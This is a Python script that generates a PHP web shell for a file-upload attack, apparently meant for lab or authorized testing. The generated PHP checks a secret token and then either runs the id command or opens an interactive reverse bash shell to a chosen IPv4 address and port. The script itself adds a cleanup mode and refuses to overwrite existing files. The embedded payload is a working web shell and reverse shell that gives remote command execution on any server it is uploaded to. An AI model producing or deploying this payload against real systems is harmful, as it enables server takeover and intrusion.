"""Create local lab upload artifacts; never upload, listen or execute PHP."""

import ipaddress
import os
import secrets
import sys
from pathlib import Path

if len(sys.argv) not in (4, 5) or (
    len(sys.argv) == 5 and sys.argv[4] != "--existing-file"
):
    raise SystemExit(
        "Usage: make-lab-upload-proof.py DIRECTORY OWNED_IPV4 PORT [--existing-file]"
    )
existing_file = len(sys.argv) == 5

directory = Path(sys.argv[1])
address = str(ipaddress.IPv4Address(sys.argv[2]))
port = int(sys.argv[3])
if not 1024 <= port <= 65535 or not directory.is_dir() or directory.is_symlink():
    raise SystemExit("Invalid directory or unprivileged callback port")
if any(
    (directory / filename).exists() or (directory / filename).is_symlink()
    for filename in ("proof.php", "name.txt", "action.headers")
):
    raise SystemExit("Local artifact exists; no replacement or generation")
token = secrets.token_hex(32)
name = "owb-" + secrets.token_hex(8) + ".php"
source = r"""<?php
header('Content-Type: text/plain');
header('Cache-Control: no-store');
if ($_SERVER['REQUEST_METHOD'] !== 'POST' ||
    !hash_equals('@TOKEN@', $_SERVER['HTTP_X_OWB_TOKEN'] ?? '')) {
    http_response_code(403); exit("denied\n");
}
$mode = $_POST['mode'] ?? '';
if ($mode === 'cleanup') {
    if (is_link(__FILE__) || !unlink(__FILE__)) {
        http_response_code(500); exit("cleanup unconfirmed\n");
    }
    exit("removed @NAME@\n");
}
if (PHP_VERSION_ID < 70400 || !function_exists('proc_open')) {
    http_response_code(409); exit("process prerequisite missing\n");
}
if ($mode === 'proof') {
    echo "executed @NAME@\n", 'host ', php_uname('n'), "\n";
    $p = proc_open(['/usr/bin/id'], [0 => ['file', '/dev/null', 'r'],
        1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
    if (!is_resource($p)) { http_response_code(500); exit("id failed\n"); }
    echo stream_get_contents($pipes[1], 4096);
    echo stream_get_contents($pipes[2], 4096);
    fclose($pipes[1]); fclose($pipes[2]);
    echo 'id exit ', proc_close($p), "\n";
    exit;
}
if ($mode !== 'callback' || !function_exists('stream_socket_client') ||
    !is_executable('/bin/bash')) {
    http_response_code(409); exit("callback prerequisite missing\n");
}
$socket = stream_socket_client('tcp://@ADDRESS@:@PORT@', $errno, $error, 5);
if ($socket === false) { http_response_code(502); exit("callback failed\n"); }
$p = proc_open(['/bin/bash', '--noprofile', '--norc', '-i'],
    [0 => $socket, 1 => $socket, 2 => $socket], $pipes);
if (!is_resource($p)) { fclose($socket); http_response_code(500); exit("shell failed\n"); }
$exit = proc_close($p);
fclose($socket);
echo 'shell exit ', $exit, "\n";
?>
"""
if existing_file:
    start = source.index("if ($mode === 'cleanup') {")
    end = source.index("if (PHP_VERSION_ID", start)
    source = (
        source[:start]
        + r"""if ($mode === 'cleanup') {
    http_response_code(409); exit("restore the existing original through the editor\n");
}
"""
        + source[end:]
    )
for key, value in [
    ("TOKEN", token),
    ("NAME", name),
    ("ADDRESS", address),
    ("PORT", str(port)),
]:
    source = source.replace("@" + key + "@", value)
for filename, content in [
    ("proof.php", source),
    ("name.txt", name + "\n"),
    ("action.headers", "X-OWB-Token: " + token + "\n"),
]:
    descriptor = os.open(
        directory / filename, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600
    )
    with os.fdopen(descriptor, "w", encoding="utf-8", newline="\n") as stream:
        stream.write(content)
